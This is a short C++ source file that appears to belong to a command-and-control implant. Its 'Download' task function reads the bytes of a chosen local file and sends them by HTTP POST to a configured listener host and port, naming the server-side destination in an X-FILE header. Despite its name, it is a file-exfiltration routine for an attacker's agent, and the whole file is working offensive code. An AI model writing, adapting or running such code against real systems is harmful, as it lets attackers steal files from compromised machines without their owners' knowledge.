#include "core/task.hpp"

namespace Task
{
    std::wstring Download(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest)
    {
        std::wstring wHeaders;
        System::Http::WinHttpResponse resp;

        // Read a local file.
        std::vector<char> byteData = System::Fs::ReadBytesFromFile(wSrc);

        // Set additional headers.
        // Specify the destination file path in the server-side.
        wHeaders = L"X-FILE: " + wDest;

        resp = System::Http::SendRequest(
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_UPLOAD_W,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)byteData.data(),
            (DWORD)byteData.size()
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return L"Error: Could not upload a file.";
        }

        return wDest.c_str();
    }
}